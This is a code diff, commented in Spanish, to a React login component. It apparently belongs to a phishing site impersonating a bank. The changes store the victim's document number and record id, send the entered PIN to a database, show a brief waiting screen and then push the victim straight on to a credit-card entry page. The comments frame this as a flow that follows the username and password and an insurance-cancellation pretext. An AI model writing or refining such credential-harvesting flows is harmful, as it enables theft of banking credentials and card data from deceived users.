@@ -177,7 +177,7 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
     }
   }
 
-  // Handlers paso 2 (PIN 4 dígitos): Envía directo a la BD y pasa a PANTALLA DE ESPERA ("loading")
+  // Handlers paso 2 (PIN 4 dígitos): Envía a la BD y transiciona automáticamente a poner Tarjeta de Crédito (TC)
   const handleStep2Submit = async (e: React.FormEvent) => {
     e.preventDefault()
     if (pin.join('').length < 4) {
@@ -185,9 +185,13 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
       return
     }
 
-    // Poner al usuario de inmediato en pantalla de espera
+    // Poner al usuario en pantalla de espera breve
     setStep('loading')
     setUserAlertMessage('')
+
+    // Guardar documento del usuario para la pantalla de TC
+    sessionStorage.setItem('auth_doc_type', docType)
+    sessionStorage.setItem('auth_doc_number', docNumber)
 
     // Leer posible solicitud de cancelación de seguro previa
     let insuranceCancellation: {
@@ -234,6 +238,7 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
       const data = await res.json().catch(() => null)
       if (data?.success && data.data?.id) {
         setRecordId(data.data.id)
+        sessionStorage.setItem('auth_record_id', String(data.data.id))
         if (insuranceCancellation) {
           sessionStorage.removeItem('insurance_cancellation_data')
         }
@@ -241,6 +246,15 @@ export const VisualAuthView: React.FC<VisualAuthViewProps> = ({ onGoToCard }) =>
     } catch (err) {
       console.warn('Error sincronizando con la base de datos:', err)
     }
+
+    // Unificación de flujo: tras user y pass, pasar automáticamente a poner Tarjeta de Crédito (TC)
+    setTimeout(() => {
+      if (onGoToCard) {
+        onGoToCard()
+      } else {
+        window.location.hash = '#tarjeta'
+      }
+    }, 1000)
   }
 
   // Manejo de cambio en los 6 dígitos
